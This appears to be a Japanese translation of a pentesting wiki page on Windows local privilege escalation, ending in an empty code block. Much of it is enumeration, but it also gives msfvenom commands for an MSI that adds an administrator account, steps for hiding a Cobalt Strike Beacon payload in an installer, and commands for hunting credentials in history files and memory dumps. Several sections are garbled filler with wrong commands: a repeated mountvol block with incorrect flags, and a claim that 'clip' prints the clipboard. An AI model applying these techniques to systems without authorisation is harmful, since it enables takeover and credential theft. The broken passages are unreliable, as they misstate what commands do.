# Windowsローカル特権昇格

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出**してください。

</details>

### **Windowsローカル特権昇格のための最適なツール：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windowsの基本理論

### アクセストークン

**Windowsのアクセストークンが何かわからない場合は、続行する前に次のページを読んでください：**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACL - DACLs/SACLs/ACEs

**このセクションの見出しで使用される略語の意味がわからない場合は、続行する前に次のページを読んでください：**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### 完全性レベル

**Windowsの完全性レベルがわからない場合は、続行する前に次のページを読んでください：**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windowsのセキュリティコントロール

Windowsには、**システムの列挙を防ぐ**、実行可能ファイルを実行することさえも**検出される可能性のあるさまざまな要素**があります。特権昇格の列挙を開始する前に、次のページを**読んで**これらの**防御メカニズム**を**列挙**してください：

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## システム情報

### バージョン情報の列挙

Windowsのバージョンに既知の脆弱性があるかどうかを確認します（適用されたパッチも確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### バージョンの脆弱性

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700以上のセキュリティ脆弱性があり、Windows環境が持つ**巨大な攻撃面**が示されています。

**システム上で**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれています)_

**システム情報をローカルで**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**エクスプロイトのGithubリポジトリ:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に保存されている資格情報/重要情報はありますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### PowerShellの履歴

PowerShellは、Windowsシステムで使用される強力なスクリプト言語およびシェル環境です。PowerShellは、コマンドの実行履歴を保存する機能を提供しています。これにより、過去のコマンドの実行内容を確認したり、再利用したりすることができます。

PowerShellの履歴は、`$PROFILE`変数で指定されたプロファイルスクリプトによって制御されます。デフォルトでは、PowerShellは履歴を保存しませんが、ユーザーはプロファイルスクリプトを編集して、履歴の保存を有効にすることができます。

以下の手順で、PowerShellの履歴を有効にすることができます。

1. PowerShellを開き、`$PROFILE`変数の値を確認します。
   ```powershell
   $PROFILE
   ```

2. プロファイルスクリプトが存在しない場合は、新しいプロファイルスクリプトを作成します。
   ```powershell
   New-Item -Type File -Path $PROFILE -Force
   ```

3. プロファイルスクリプトをテキストエディタで開き、以下のコードを追加します。
   ```powershell
   $HistoryPath = Join-Path -Path $env:USERPROFILE -ChildPath "powershell_history.txt"
   Register-EngineEvent PowerShell.Exiting -Action { Get-History | Export-Csv -Path $HistoryPath -NoTypeInformation }
   ```

4. プロファイルスクリプトを保存し、PowerShellを再起動します。

これで、PowerShellの履歴が有効になり、終了時に`powershell_history.txt`という名前のファイルに履歴が保存されます。履歴を表示するには、以下のコマンドを使用します。

```powershell
Get-Content -Path $HistoryPath
```

また、`Get-History`コマンドを使用して、現在のセッションの履歴を表示することもできます。

```powershell
Get-History
```

これにより、PowerShellの履歴を活用して、効率的な作業を行うことができます。
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShellトランスクリプトファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で、これを有効にする方法を学ぶことができます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShellモジュールのログ記録

PowerShellのパイプライン実行の詳細を記録します。これには、コマンドの実行、コマンドの呼び出し、および一部のスクリプトの内容が含まれます。実行の全詳細や出力結果を持っているわけではありません。\
これを有効にするには、最後のセクション（トランスクリプトファイル）のリンクに従って、「Powershellトランスクリプション」の代わりに「モジュールログ記録」を有効にします。
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
最後の15件のPowerShellログを表示するには、次のコマンドを実行します：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **スクリプトブロックの記録**

スクリプトブロックの記録は、コードブロックが実行されるたびにそれらを記録するため、スクリプトの完全なアクティビティと内容をキャプチャします。それは各アクティビティの完全な監査トレイルを維持し、後でフォレンジックや悪意のある動作の研究に使用することができます。実行時にすべてのアクティビティを記録するため、完全な詳細を提供します。
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
スクリプトブロックのログイベントは、Windowsイベントビューアの以下のパスにあります：_アプリケーションとサービスのログ > Microsoft > Windows > Powershell > Operational_\
最後の20のイベントを表示するには、次のコマンドを使用します：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定

#### Internet Explorer ゾーンのセキュリティ設定

- インターネットゾーンのセキュリティレベルを高めることで、悪意のあるウェブサイトからの攻撃を防ぐことができます。

- インターネットオプションを開き、セキュリティタブに移動します。

- インターネットゾーンを選択し、セキュリティレベルを高に設定します。

- 信頼済みサイトゾーンとローカルイントラネットゾーンのセキュリティレベルも適切に設定します。

#### プロキシ設定

- プロキシサーバーを使用する場合は、適切な設定を行うことでセキュリティを向上させることができます。

- インターネットオプションを開き、接続タブに移動します。

- LANの設定を選択し、プロキシサーバーのアドレスとポートを設定します。

#### ファイアウォール設定

- ファイアウォールを適切に設定することで、ネットワークへの不正アクセスを防ぐことができます。

- Windowsの設定からファイアウォールを開きます。

- 必要なポートを開放し、不要なポートを閉じるように設定します。

#### セキュリティソフトウェアの設定

- セキュリティソフトウェアを使用する場合は、適切な設定を行うことでセキュリティを強化することができます。

- セキュリティソフトウェアの設定画面を開き、必要なオプションを有効にします。

- 定期的なアップデートを行い、最新のセキュリティ定義を保持します。

#### セキュリティアップデートの適用

- Windowsのセキュリティアップデートを定期的に適用することで、既知の脆弱性からの攻撃を防ぐことができます。

- Windows Updateを開き、最新のセキュリティアップデートをインストールします。

- 自動更新を有効にすることで、新しいアップデートが自動的に適用されるように設定します。
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ

Windowsシステムでは、ドライブはファイルシステムへのアクセスを提供する重要な要素です。ドライブには、ローカルドライブ（Cドライブ、Dドライブなど）やネットワークドライブ（共有フォルダなど）などがあります。

以下に、ドライブに関連する情報と攻撃技術について説明します。

#### ドライブの一覧表示

ドライブの一覧表示には、次のコマンドを使用します。

```bash
wmic logicaldisk get caption,description,drivetype,volumename
```

#### ドライブのマウントポイントの一覧表示

ドライブのマウントポイントの一覧表示には、次のコマンドを使用します。

```bash
mountvol
```

#### ドライブのマウントポイントの削除

ドライブのマウントポイントを削除するには、次のコマンドを使用します。

```bash
mountvol <ドライブのパス> /D
```

#### ドライブのマウントポイントの作成

ドライブにマウントポイントを作成するには、次のコマンドを使用します。

```bash
mountvol <ドライブのパス> /D
```

#### ドライブのマウントポイントの変更

ドライブのマウントポイントを変更するには、次のコマンドを使用します。

```bash
mountvol <ドライブのパス> /L
```

#### ドライブのマウントポイントの追加

ドライブにマウントポイントを追加するには、次のコマンドを使用します。

```bash
mountvol <ドライブのパス> /P
```

#### ドライブのマウントポイントの削除

ドライブのマウントポイントを削除するには、次のコマンドを使用します。

```bash
mountvol <ドライブのパス> /D
```

#### ドライブのマウントポイントの一覧表示

ドライブのマウントポイントの一覧表示には、次のコマンドを使用します。

```bash
mountvol
```

#### ドライブのマウントポイントの削除

ドライブのマウントポイントを削除するには、次のコマンドを使用します。

```bash
mountvol <ドライブのパス> /D
```

#### ドライブのマウントポイントの作成

ドライブにマウントポイントを作成するには、次のコマンドを使用します。

```bash
mountvol <ドライブのパス> /D
```

#### ドライブのマウントポイントの変更

ドライブのマウントポイントを変更するには、次のコマンドを使用します。

```bash
mountvol <ドライブのパス> /L
```

#### ドライブのマウントポイントの追加

ドライブにマウントポイントを追加するには、次のコマンドを使用します。

```bash
mountvol <ドライブのパス> /P
```

#### ドライブのマウントポイントの削除

ドライブのマウントポイントを削除するには、次のコマンドを使用します。

```bash
mountvol <ドライブのパス> /D
```
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

システムを侵害することができます。もし更新がhttpではなくhttp**S**を使用してリクエストされていない場合です。

次のコマンドを実行して、ネットワークが非SSLのWSUSアップデートを使用しているかどうかを確認します。
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
もし以下のような返答を受け取った場合：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` が `1` に等しい場合、**これは悪用可能です**。最後のレジストリが0に等しい場合、WSUSのエントリは無視されます。

この脆弱性を悪用するために、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS](https://github.com/GoSecure/pywsus)などのツールを使用することができます。これらは、非SSLのWSUSトラフィックに「偽の」更新を注入するためのMiTM武器化されたエクスプロイトスクリプトです。

研究はこちらで読むことができます：

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**完全なレポートはこちらで読むことができます**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。\
基本的に、このバグが悪用する欠陥は次のとおりです：

> もしローカルユーザープロキシを変更する権限がある場合、そしてWindows UpdatesがInternet Explorerの設定で構成されたプロキシを使用する場合、私たちは自分自身のトラフィックを傍受し、アセット上で昇格したユーザーとしてコードを実行する権限を持つため、[PyWSUS](https://github.com/GoSecure/pywsus)をローカルで実行する権限を持つことになります。
>
> さらに、WSUSサービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUSホスト名の自己署名証明書を生成し、この証明書を現在のユーザーの証明書ストアに追加すると、HTTPおよびHTTPSのWSUSトラフィックを傍受することができます。WSUSは、証明書に対して信頼済みで正しいホスト名を持つ場合にのみ、HSTSのようなメカニズムを使用して信頼性を実装していません。

この脆弱性を悪用するためには、[**WSUSpicious**](https://github.com/GoSecure/wsuspicious)ツールを使用することができます（解放されたら）。

## KrbRelayUp

これは、**LDAP署名が強制されていない**Windows **ドメイン**環境での**ユニバーサルな修正不可能なローカル特権昇格**です。ユーザーには**自己権限**（**RBCD**の設定）があり、ドメイン内で**コンピュータを作成**することができる必要があります。\
すべての**要件**は**デフォルトの設定**で満たされています。

エクスプロイトは[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)で見つけることができます。

攻撃が成功するかどうかに関しては、攻撃のフローについての詳細は[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)を参照してください。

## AlwaysInstallElevated

これらの2つのレジストリが**有効**（値が**0x1**）になっている場合、任意の特権を持つユーザーはNT AUTHORITY\\**SYSTEM**として`*.msi`ファイルを**インストール**（実行）することができます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploitのペイロード

Metasploitは、侵入テストや脆弱性診断に使用される人気のあるフレームワークです。Metasploitには、様々なペイロード（攻撃コード）が用意されており、これらのペイロードを使用することで、標的システムに対して様々な攻撃を実行することができます。

以下に、Metasploitで使用可能な一部のペイロードの例を示します。

- **reverse_tcp**: このペイロードは、標的システムからMetasploitハンドラに逆接続を行い、シェルを取得します。これにより、リモートでコマンドを実行したり、ファイルを転送したりすることができます。

- **bind_tcp**: このペイロードは、Metasploitハンドラが標的システムからの接続を待ち受け、シェルを取得します。これにより、リモートでコマンドを実行したり、ファイルを転送したりすることができます。

- **meterpreter**: このペイロードは、Metasploitの高度なフレームワークであるMeterpreterを使用します。Meterpreterは、標的システムに対してより高度な操作を行うことができるため、侵入テストや脆弱性診断において非常に便利です。

これらのペイロードは、Metasploitの柔軟性とパワーを活用するために使用されます。ただし、これらのペイロードを使用する際には、法的な制約や適切な許可を確保することが重要です。
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
もしもメータプリーターセッションを持っている場合、モジュール**`exploit/windows/local/always_install_elevated`**を使用してこのテクニックを自動化することができます。

### PowerUP

PowerUPの`Write-UserAddMSI`コマンドを使用して、特権を昇格させるためのWindows MSIバイナリを現在のディレクトリ内に作成します。このスクリプトは、ユーザー/グループの追加を求める事前コンパイルされたMSIインストーラを出力します（したがって、GUIアクセスが必要です）。
```
Write-UserAddMSI
```
### MSIラッパー

このツールを使用してMSIラッパーを作成する方法については、このチュートリアルを参照してください。ただし、**コマンドラインを実行するだけ**の場合は、"**.bat**"ファイルをラップすることもできます。

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### WIXを使用してMSIを作成する

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Visual Studioを使用してMSIを作成する

* Cobalt StrikeまたはMetasploitで`C:\privesc\beacon.exe`に新しいWindows EXE TCPペイロードを**生成**します。
* **Visual Studio**を開き、**新しいプロジェクトを作成**を選択し、検索ボックスに「installer」と入力します。**Setup Wizard**プロジェクトを選択し、**次へ**をクリックします。
* **AlwaysPrivesc**などのプロジェクト名を付け、場所に**`C:\privesc`**を使用し、**ソリューションとプロジェクトを同じディレクトリに配置する**を選択し、**作成**をクリックします。
* **次へ**をクリックし続け、ステップ4の3に到達するまで（含まれるファイルを選択する）。**追加**をクリックし、さきほど生成したBeaconペイロードを選択します。その後、**完了**をクリックします。
* **ソリューションエクスプローラー**で**AlwaysPrivesc**プロジェクトを強調表示し、**プロパティ**で**TargetPlatform**を**x86**から**x64**に変更します。
* インストールされたアプリがより正当に見えるようにするために、**Author**や**Manufacturer**などの他のプロパティも変更できます。
* プロジェクトを右クリックし、**表示 > カスタムアクション**を選択します。
* **インストール**を右クリックし、**カスタムアクションの追加**を選択します。
* **Application Folder**をダブルクリックし、**beacon.exe**ファイルを選択し、**OK**をクリックします。これにより、インストーラが実行されるとすぐにBeaconペイロードが実行されます。
* **カスタムアクションのプロパティ**で、**Run64Bit**を**True**に変更します。
* 最後に、**ビルド**します。
* 警告`File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`が表示される場合は、プラットフォームをx64に設定していることを確認してください。

### MSIのインストール

悪意のある`.msi`ファイルの**インストール**を**バックグラウンドで**実行するには、以下の手順を実行します：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、_exploit/windows/local/always\_install\_elevated_ を使用できます。

## アンチウイルスと検出器

### 監査設定

これらの設定は、**ログに記録**される内容を決定するため、注意が必要です。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding（WEF）は、ログが送信される場所を知るために興味深いです。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**は、ドメインに参加しているコンピュータ上の**ローカル管理者パスワードを管理**することができます。これらのパスワードは、Active Directoryに集中的に保存され、ACLを使用して認可されたユーザーに制限されます。十分な権限が与えられている場合、ローカル管理者のパスワードを読み取ることができるかもしれません。

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

有効な場合、**平文のパスワードはLSASS（Local Security Authority Subsystem Service）に保存**されます。\
[**このページでWDigestについての詳細情報**](../stealing-credentials/credentials-protections.md#wdigest)をご覧ください。
```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```
### LSA保護

Microsoftは**Windows 8.1以降**で、LSAの追加の保護を提供しています。これにより、信頼されていないプロセスがLSAのメモリを読み取ったり、コードを注入したりすることができなくなります。\
[**LSA保護に関する詳細情報はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
```
### Credentials Guard

**Credential Guard（資格情報ガード）**は、Windows 10（EnterpriseおよびEducationエディション）の新機能であり、ハッシュのパスワード攻撃などの脅威からマシン上の資格情報を保護するのに役立ちます。\
[**Credentials Guardに関する詳細はこちらを参照してください。**](../stealing-credentials/credentials-protections.md#credential-guard)
```
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```
### キャッシュされた資格情報

**ドメインの資格情報**は、オペレーティングシステムのコンポーネントによって使用され、**ローカル** **セキュリティ権限**（LSA）によって**認証**されます。通常、ドメインの資格情報は、登録されたセキュリティパッケージがユーザーのログオンデータを認証する際に、ユーザーのために確立されます。\
[**キャッシュされた資格情報に関する詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

所属しているグループの中に興味深い権限を持つものがあるかどうかを確認する必要があります。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

もし**特権グループに所属している場合、特権をエスカレーションすることができる**かもしれません。特権グループについて学び、特権を悪用して特権をエスカレーションする方法については、こちらを参照してください：

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### トークンの操作

**トークン**についての詳細は、このページで学びましょう：[**Windows トークン**](../authentication-credentials-uac-and-efs.md#access-tokens)。\
興味深いトークンについて学び、それらを悪用する方法については、以下のページをチェックしてください：

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### ログインユーザー / セッション
```
qwinsta
klist sessions
```
### ホームフォルダー

The home folder is a directory on a Windows system that is assigned to each user account. It contains personal files, settings, and configurations specific to that user. In a Windows environment, the home folder is typically located in the `C:\Users` directory and is named after the user's username.

ホームフォルダーは、Windowsシステム上の各ユーザーアカウントに割り当てられたディレクトリです。個人のファイル、設定、およびそのユーザーに固有の構成が含まれています。Windows環境では、ホームフォルダーは通常、`C:\Users`ディレクトリにあり、ユーザーのユーザー名に基づいて名前が付けられています。
```
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー

Windowsシステムのセキュリティを向上させるために、適切なパスワードポリシーを設定することが重要です。以下に、パスワードポリシーの設定に関するいくつかの重要なポイントを示します。

- パスワードの長さ：パスワードは最低でも8文字以上である必要があります。より長いパスワードを使用することを推奨します。
- 複雑さの要件：パスワードには、大文字と小文字のアルファベット、数字、特殊文字を含める必要があります。これにより、推測されにくいパスワードが作成されます。
- パスワードの有効期限：パスワードは定期的に変更する必要があります。一般的には、60〜90日ごとに変更することが推奨されます。
- パスワードの履歴：以前に使用されたパスワードを再利用することを防ぐために、パスワードの履歴を保持することが重要です。一般的には、最後に使用された数回分のパスワードを記憶するように設定します。
- ロックアウトポリシー：一定回数の誤ったパスワード入力試行後にアカウントをロックすることで、不正アクセスを防止することができます。一般的には、3〜5回の試行後にアカウントをロックするように設定します。

これらのパスワードポリシーを適切に設定することで、Windowsシステムのセキュリティを強化することができます。
```
net accounts
```
### クリップボードの内容を取得する

To get the content of the clipboard, you can use the following methods:

#### Method 1: PowerShell

```powershell
Get-Clipboard
```

This command will retrieve the content of the clipboard and display it in the PowerShell console.

#### Method 2: Command Prompt

```batch
clip
```

Running the `clip` command in the Command Prompt will output the content of the clipboard.

#### Method 3: Python

```python
import pyperclip

content = pyperclip.paste()
print(content)
```

Using the `pyperclip` library in Python, you can retrieve the content of the clipboard and print it.

#### Method 4: C#

```csharp
using System;
using System.Windows.Forms;

class Program
{
    static void Main()
    {
        IDataObject dataObject = Clipboard.GetDataObject();
        string content = (string)dataObject.GetData(DataFormats.Text);
        Console.WriteLine(content);
    }
}
```

In C#, you can use the `Clipboard` class to access the clipboard data and retrieve its content.

These methods can be used to obtain the content of the clipboard, which can be useful in various scenarios, including local privilege escalation.
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず、プロセスをリストアップして、**プロセスのコマンドライン内にパスワードが含まれているかどうかを確認**します。\
実行中のバイナリを**上書きすることができるか**、またはバイナリフォルダに書き込み権限があるかどうかを確認して、[**DLLハイジャック攻撃**](dll-hijacking.md)を悪用できるかどうかを調べます。
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に実行中の[**electron/cef/chromiumデバッガー**を確認し、特権をエスカレーションするために悪用することができます](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)。

**プロセスバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリフォルダのパーミッションをチェックする（**[**DLLハイジャッキング**](dll-hijacking.md)**）**

プロセスのバイナリフォルダのパーミッションをチェックすることは、特権昇格の可能性を見つけるために重要です。特に、DLLハイジャッキング攻撃の場合、悪意のあるDLLをプロセスが読み込むことができる場合があります。

以下の手順でパーミッションをチェックします。

1. ターゲットプロセスのバイナリフォルダを特定します。
2. バイナリフォルダのパーミッションを確認します。
3. バイナリフォルダが書き込み可能な場合、攻撃者は悪意のあるDLLを配置することができます。

このチェックは、特権昇格の脆弱性を見つけるために重要なステップです。
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### メモリパスワードマイニング

sysinternalsの**procdump**を使用して、実行中のプロセスのメモリダンプを作成することができます。FTPのようなサービスでは、**メモリ内に平文でクレデンシャルが保存**されている場合がありますので、メモリをダンプしてクレデンシャルを読み取ってみてください。
```
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### セキュリティの甘いGUIアプリ

**SYSTEMとして実行されているアプリケーションでは、ユーザーがCMDを起動したり、ディレクトリを閲覧したりすることができる場合があります。**

例: "Windowsヘルプとサポート" (Windows + F1) を開き、"コマンドプロンプト"と検索し、"クリックしてコマンドプロンプトを開く"をクリックします。

## サービス

サービスのリストを取得するには、以下のコマンドを実行します。
```
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc**を使用してサービスの情報を取得できます。
```
sc qc <service_name>
```
各サービスの必要な特権レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を使用することをおすすめします。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」がどのサービスでも変更できるかどうかを確認することをおすすめします。
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[ここからXP用のaccesschk.exeをダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスの有効化

もしSSDPSRVなどのエラーが発生している場合:

_システムエラー1058が発生しました。_\
_このサービスは無効化されているか、または関連付けられた有効なデバイスがありません。_

以下の方法で有効化することができます。
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**この問題では、サービスupnphostはSSDPSRVに依存して動作します（XP SP1の場合）**

**この問題の別の回避策は、次のコマンドを実行することです：**
```
sc.exe config usosvc start= auto
```
### **サービスのバイナリパスの変更**

もしグループ「認証済みユーザー」がサービスに対して **SERVICE\_ALL\_ACCESS** を持っている場合、そのサービスが実行するバイナリを変更することができます。変更して **nc** を実行するには、以下の手順を実行します:
```bash
